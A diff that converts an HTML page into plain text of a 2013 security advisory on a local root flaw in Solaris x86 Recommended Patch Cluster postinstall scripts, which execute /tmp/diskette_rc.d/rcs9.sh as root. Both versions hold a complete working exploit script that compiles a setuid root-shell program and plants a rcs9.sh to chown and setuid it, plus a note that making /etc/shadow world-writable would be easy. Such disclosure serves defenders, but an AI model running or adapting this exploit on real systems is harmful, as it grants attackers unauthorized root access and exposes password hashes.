@@ -1,52 +1,82 @@
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
-"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml">
-<head>
-<title></title>
-<meta name="generator" content="HTML::TextToHTML v2.51"/>
-</head>
-<body>
-<p>&lt;html&gt;&lt;title&gt;Vulnerability&lt;/title&gt;&lt;head&gt; &lt;style type="text/css"&gt;&lt;!-- A {text-decoration:none} --&gt;div {
-</p><p>    white-space: pre-wrap;      /* CSS3 <em>/
-    white-space: -moz-pre-wrap; /</em> Firefox <em>/
-    white-space: -pre-wrap;     /</em> Opera &lt;7 <em>/
-    white-space: -o-pre-wrap;   /</em> Opera 7 */
-    word-wrap: break-word;<br/>
-}&lt;/style&gt;&lt;/head&gt;&lt;body alink="<strong>EE0000" link="</strong>0000EE" bgcolor="#333333" text="#000000" vlink="#551A8B"&gt;&lt;center&gt;&lt;table border="0" cellpadding="2" cellspacing="2" width="70%"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style="background-color:rgb(150,200,200);font-weight: bold;"&gt;&lt;center&gt;Advisory #: 38&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Title:&lt;/b&gt; Solaris Recommended Patch Cluster 6/19 local root on x86&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Author: &lt;/b&gt;Larry W. Cashdollar, @_larry0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Date:&lt;/b&gt; 2013-07-03&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Download Site:&lt;/b&gt; &lt;a href="<a href="http://www.oracle.com/">www.oracle.com</a>"&gt;<a href="http://www.oracle.com/">www.oracle.com</a>&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor: &lt;/b&gt;Oracle&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Notified: &lt;/b&gt; 2013-07-03&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Contact:&lt;/b&gt; <a href="mailto:security@oracle.com">security@oracle.com</a>&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Description:&lt;/b&gt; &lt;span style="color: rgb(0, 0, 0); font-family: Times; font-size: medium; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: normal; orphans: auto; text-align: start; text-indent: 0px; text-transform: none; white-space: pre-wrap; widows: auto; word-spacing: 0px; -webkit-text-stroke-width: 0px; display: inline !important; float: none;"&gt;If the system administrator is updating the system using update manager or smpatch (multi user mode) a local user could execute commands as root. This only affects x86 systems as this code resides under a case statement checking that the platform is intel based.&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vulnerability:&lt;/b&gt;&lt;div&gt;Write to /tmp/diskette_rc.d/rcs9.sh before execution and you can execute commands as root.
-</p><p>./144751-01/SUNWos86r/install/postinstall 
-</p>
-<pre>
-   782          if [ -s /tmp/disketterc.d/rcs9.sh ]
-   783          then
-   784                  /sbin/sh /tmp/disketterc.d/rcs9.sh &amp;quot;post&amp;quot;
-   785          fi</pre>
-<p>Inject entries into driver_aliases, research config file? maybe we can load our own library/driver?
-</p><p>   804  <strong> Remove erroneous entry for Symbios Logic 53c875/95 (ncrs)
-   805  TMPFILE=/tmp/ncrstmp<br/>
-   806  sed -e &amp;</strong>039;/^ncrs &amp;quot;pci1000,1000&amp;quot;$/d&amp;#039; ${BASEDIR}/etc/driveraliases &amp;gt;$TMPFILE
-   807  cp $TMPFILE ${BASEDIR}/etc/driver_aliases
-</p><p>./141445-09/SUNWos86r/install/postinstall
-</p><pre>
-   656          if [ -s /tmp/disketterc.d/rcs9.sh ]
-   657          then
-   658                  /sbin/sh /tmp/disketterc.d/rcs9.sh &amp;quot;post&amp;quot;
-   659          fi</pre>
-<p>Well, it looks like you&amp;#039;ve got a few chances to abuse it:
-</p><p>larry@slowaris:~/10x86Recommended/patches$ find . -name &amp;quot;*install&amp;quot; -type f -exec grep -l &amp;quot;/sbin/sh /tmp/diskette_rc.d/rcs9.sh&amp;quot; {} \;
-./144501-19/SUNWos86r/install/postinstall
-./141445-09/SUNWos86r/install/postinstall
-./142059-01/SUNWos86r/install/postinstall
-./147148-26/SUNWos86r/install/postinstall
-./127128-11/SUNWos86r/install/postinstall
-./148889-03/SUNWos86r/install/postinstall
-./142910-17/SUNWos86r/install/postinstall
-./144751-01/SUNWos86r/install/postinstall
-Psuedo PoC:
-</p><p>Depending on how rcs9.sh is created, we can either write to it repeatedly or just create the file initially with our malicious entry.
-According to the code if the file exists, it&amp;#039;s just executed. Easy. 
-chmod 666 /etc/shadow would be easy. &lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;CVE-2010-1183&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;JSON:&lt;/b&gt;&lt;a href="json.php?s=38"&gt; Export&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Exploit Code:&lt;/b&gt;&lt;div&gt;&lt;pre class="php" style="font-family:monospace;"&gt;&lt;ol&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;#!/bin/sh&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;#Larry W. Cashdollar, local root for Solaris x86 during patching&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;#10/4/2013 Tested on Cluster 9/30/2013&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;# larry@s0l4r1s:~$ ./disk_exp.sh &lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;# [+] Creating evil shell&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;# [+] Hope you've got gcc on here, compiling...&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;# [+] Waiting for root shell&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;# [+] Tada!&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;# # id&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;# uid=0(root) gid=0(root)&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #b1b100;"&gt;echo&lt;/span&gt; &lt;span style="color: #0000ff;"&gt;&amp;quot;[+] Creating evil shell&amp;quot;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;cat &lt;span style="color: #339933;"&gt;&amp;lt;&amp;lt;&lt;/span&gt; EOF &lt;span style="color: #339933;"&gt;&amp;gt;&lt;/span&gt; r00t&lt;span style="color: #339933;"&gt;.&lt;/span&gt;c&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;#include &amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;int&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;main &lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;void&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #009900;"&gt;&amp;#123;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;  char &lt;span style="color: #339933;"&gt;*&lt;/span&gt;shell&lt;span style="color: #009900;"&gt;&amp;#91;&lt;/span&gt;&lt;span style="color: #cc66cc;"&gt;2&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#93;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;  shell&lt;span style="color: #009900;"&gt;&amp;#91;&lt;/span&gt;&lt;span style="color: #cc66cc;"&gt;0&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#93;&lt;/span&gt; &lt;span style="color: #339933;"&gt;=&lt;/span&gt; &lt;span style="color: #0000ff;"&gt;&amp;quot;sh&amp;quot;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;  shell&lt;span style="color: #009900;"&gt;&amp;#91;&lt;/span&gt;&lt;span style="color: #cc66cc;"&gt;1&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#93;&lt;/span&gt; &lt;span style="color: #339933;"&gt;=&lt;/span&gt; &lt;span style="color: #009900; font-weight: bold;"&gt;NULL&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;  setreuid &lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;&lt;span style="color: #cc66cc;"&gt;0&lt;/span&gt;&lt;span style="color: #339933;"&gt;,&lt;/span&gt; &lt;span style="color: #cc66cc;"&gt;0&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;  setregid &lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;&lt;span style="color: #cc66cc;"&gt;0&lt;/span&gt;&lt;span style="color: #339933;"&gt;,&lt;/span&gt; &lt;span style="color: #cc66cc;"&gt;0&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;  execve &lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;&lt;span style="color: #0000ff;"&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;&lt;span style="color: #339933;"&gt;,&lt;/span&gt; shell&lt;span style="color: #339933;"&gt;,&lt;/span&gt; &lt;span style="color: #009900; font-weight: bold;"&gt;NULL&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;  &lt;span style="color: #b1b100;"&gt;return&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;&lt;span style="color: #cc66cc;"&gt;0&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #009900;"&gt;&amp;#125;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;EOF&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #b1b100;"&gt;echo&lt;/span&gt; &lt;span style="color: #0000ff;"&gt;&amp;quot;[+] Hope you've got gcc on here, compiling...&amp;quot;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;gcc r00t&lt;span style="color: #339933;"&gt;.&lt;/span&gt;c &lt;span style="color: #339933;"&gt;-&lt;/span&gt;o &lt;span style="color: #339933;"&gt;/&lt;/span&gt;tmp&lt;span style="color: #339933;"&gt;/&lt;/span&gt;r00t&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;a href="<a href="http://www.php.net/mkdir">http://www.php.net/mkdir</a>"&gt;&lt;span style="color: #990000;"&gt;mkdir&lt;/span&gt;&lt;/a&gt; &lt;span style="color: #339933;"&gt;-&lt;/span&gt;p &lt;span style="color: #339933;"&gt;/&lt;/span&gt;tmp&lt;span style="color: #339933;"&gt;/&lt;/span&gt;diskette_rc&lt;span style="color: #339933;"&gt;.&lt;/span&gt;d&lt;span style="color: #339933;"&gt;/&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #b1b100;"&gt;echo&lt;/span&gt; &lt;span style="color: #0000ff;"&gt;&amp;quot;#!/bin/sh&amp;quot;&lt;/span&gt; &lt;span style="color: #339933;"&gt;&amp;gt;&lt;/span&gt; &lt;span style="color: #339933;"&gt;/&lt;/span&gt;tmp&lt;span style="color: #339933;"&gt;/&lt;/span&gt;diskette_rc&lt;span style="color: #339933;"&gt;.&lt;/span&gt;d&lt;span style="color: #339933;"&gt;/&lt;/span&gt;rcs9&lt;span style="color: #339933;"&gt;.&lt;/span&gt;sh&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #b1b100;"&gt;echo&lt;/span&gt; &lt;span style="color: #0000ff;"&gt;&amp;quot;chown root:root /tmp/r00t&amp;quot;&lt;/span&gt; &lt;span style="color: #339933;"&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style="color: #339933;"&gt;/&lt;/span&gt;tmp&lt;span style="color: #339933;"&gt;/&lt;/span&gt;diskette_rc&lt;span style="color: #339933;"&gt;.&lt;/span&gt;d&lt;span style="color: #339933;"&gt;/&lt;/span&gt;rcs9&lt;span style="color: #339933;"&gt;.&lt;/span&gt;sh&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #b1b100;"&gt;echo&lt;/span&gt; &lt;span style="color: #0000ff;"&gt;&amp;quot;chmod +s /tmp/r00t&amp;quot;&lt;/span&gt; &lt;span style="color: #339933;"&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style="color: #339933;"&gt;/&lt;/span&gt;tmp&lt;span style="color: #339933;"&gt;/&lt;/span&gt;diskette_rc&lt;span style="color: #339933;"&gt;.&lt;/span&gt;d&lt;span style="color: #339933;"&gt;/&lt;/span&gt;rcs9&lt;span style="color: #339933;"&gt;.&lt;/span&gt;sh&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;a href="<a href="http://www.php.net/chmod">http://www.php.net/chmod</a>"&gt;&lt;span style="color: #990000;"&gt;chmod&lt;/span&gt;&lt;/a&gt; &lt;span style="color: #339933;"&gt;+&lt;/span&gt;x &lt;span style="color: #339933;"&gt;/&lt;/span&gt;tmp&lt;span style="color: #339933;"&gt;/&lt;/span&gt;diskette_rc&lt;span style="color: #339933;"&gt;.&lt;/span&gt;d&lt;span style="color: #339933;"&gt;/&lt;/span&gt;rcs9&lt;span style="color: #339933;"&gt;.&lt;/span&gt;sh&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #b1b100;"&gt;echo&lt;/span&gt; &lt;span style="color: #0000ff;"&gt;&amp;quot;[+] Waiting for root shell&amp;quot;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;until &lt;span style="color: #009900;"&gt;&amp;#91;&lt;/span&gt;  &lt;span style="color: #339933;"&gt;-&lt;/span&gt;u &lt;span style="color: #339933;"&gt;/&lt;/span&gt;tmp&lt;span style="color: #339933;"&gt;/&lt;/span&gt;r00t &lt;span style="color: #009900;"&gt;&amp;#93;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt; &lt;span style="color: #b1b100;"&gt;do&lt;/span&gt; &lt;a href="<a href="http://www.php.net/sleep">http://www.php.net/sleep</a>"&gt;&lt;span style="color: #990000;"&gt;sleep&lt;/span&gt;&lt;/a&gt; &lt;span style="color: #cc66cc;"&gt;1&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt; done&lt;span style="color: #339933;"&gt;;&lt;/span&gt; &lt;span style="color: #b1b100;"&gt;echo&lt;/span&gt; &lt;span style="color: #0000ff;"&gt;&amp;quot;[+] Tada!&amp;quot;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;/&lt;/span&gt;tmp&lt;span style="color: #339933;"&gt;/&lt;/span&gt;r00t&lt;/div&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Screen Shots:&lt;/b&gt; &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Advisory:&lt;/b&gt; &lt;a href="<a href="http://www.vapid.dhs.org/advisories/solaris-patch-cluster-x86root.html">http://www.vapid.dhs.org/advisories/solaris-patch-cluster-x86root.html</a>"&gt;<a href="http://www.vapid.dhs.org/advisories/solaris-patch-cluster-x86root.html&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt">http://www.vapid.dhs.org/advisories/solaris-patch-cluster-x86root.html&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt</a>;
-&lt;/html&gt;
-</p>
-
-</body>
-</html>
+                                Advisory #: 38
+Title: Solaris Recommended Patch Cluster 6/19 local root on x86
+Author:Larry W. Cashdollar, @_larry0
+Date: 2013-07-03
+Download Site: www.oracle.com
+Vendor:Oracle
+Vendor Notified: 2013-07-03
+Vendor Contact: security@oracle.com
+Description: If the system administrator is updating the system using update
+manager or smpatch (multi user mode) a local user could execute commands as
+root. This only affects x86 systems as this code resides under a case statement
+checking that the platform is intel based.
+Vulnerability:
+Write to /tmp/diskette_rc.d/rcs9.sh before execution and you can execute
+commands as root. ./144751-01/SUNWos86r/install/postinstall 782 if [ -s /tmp/
+disketterc.d/rcs9.sh ] 783 then 784 /sbin/sh /tmp/disketterc.d/rcs9.sh "post"
+785 fi Inject entries into driver_aliases, research config file? maybe we can
+load our own library/driver? 804 # Remove erroneous entry for Symbios Logic
+53c875/95 (ncrs) 805 TMPFILE=/tmp/ncrstmp 806 sed -e '/^ncrs "pci1000,1000"$/d'
+${BASEDIR}/etc/driveraliases >$TMPFILE 807 cp $TMPFILE ${BASEDIR}/etc/
+driver_aliases ./141445-09/SUNWos86r/install/postinstall 656 if [ -s /tmp/
+disketterc.d/rcs9.sh ] 657 then 658 /sbin/sh /tmp/disketterc.d/rcs9.sh "post"
+659 fi Well, it looks like you've got a few chances to abuse it:
+larry@slowaris:~/10x86Recommended/patches$ find . -name "*install" -type f -
+exec grep -l "/sbin/sh /tmp/diskette_rc.d/rcs9.sh" {} \; ./144501-19/SUNWos86r/
+install/postinstall ./141445-09/SUNWos86r/install/postinstall ./142059-01/
+SUNWos86r/install/postinstall ./147148-26/SUNWos86r/install/postinstall ./
+127128-11/SUNWos86r/install/postinstall ./148889-03/SUNWos86r/install/
+postinstall ./142910-17/SUNWos86r/install/postinstall ./144751-01/SUNWos86r/
+install/postinstall Psuedo PoC: Depending on how rcs9.sh is created, we can
+either write to it repeatedly or just create the file initially with our
+malicious entry. According to the code if the file exists, it's just executed.
+Easy. chmod 666 /etc/shadow would be easy.
+CVE-2010-1183
+JSON:Export
+Exploit Code:
+   1. #!/bin/sh
+   2. #Larry W. Cashdollar, local root for Solaris x86 during patching
+   3. #10/4/2013 Tested on Cluster 9/30/2013
+   4. # larry@s0l4r1s:~$ ./disk_exp.sh
+   5. # [+] Creating evil shell
+   6. # [+] Hope you've got gcc on here, compiling...
+   7. # [+] Waiting for root shell
+   8. # [+] Tada!
+   9. # # id
+  10. # uid=0(root) gid=0(root)
+  11.  
+  12.  
+  13. echo "[+] Creating evil shell"
+  14.  
+  15. cat << EOF > r00t.c
+  16. #include <stdio.h>
+  17. #include <unistd.h>
+  18. int
+  19. main (void)
+  20. {
+  21.   char *shell[2];
+  22.   shell[0] = "sh";
+  23.   shell[1] = NULL;
+  24.   setreuid (0, 0);
+  25.   setregid (0, 0);
+  26.   execve ("/bin/sh", shell, NULL);
+  27.   return(0);
+  28. }
+  29. EOF
+  30.  
+  31. echo "[+] Hope you've got gcc on here, compiling..."
+  32.  
+  33. gcc r00t.c -o /tmp/r00t
+  34.  
+  35. mkdir -p /tmp/diskette_rc.d/
+  36.  
+  37. echo "#!/bin/sh" > /tmp/diskette_rc.d/rcs9.sh
+  38. echo "chown root:root /tmp/r00t" >> /tmp/diskette_rc.d/rcs9.sh
+  39. echo "chmod +s /tmp/r00t" >> /tmp/diskette_rc.d/rcs9.sh
+  40. chmod +x /tmp/diskette_rc.d/rcs9.sh
+  41. echo "[+] Waiting for root shell"
+  42.  
+  43. until [  -u /tmp/r00t ]; do sleep 1; done; echo "[+] Tada!";/tmp/r00t
+Screen Shots:
+Advisory: http://www.vapid.dhs.org/advisories/solaris-patch-cluster-
+x86root.html
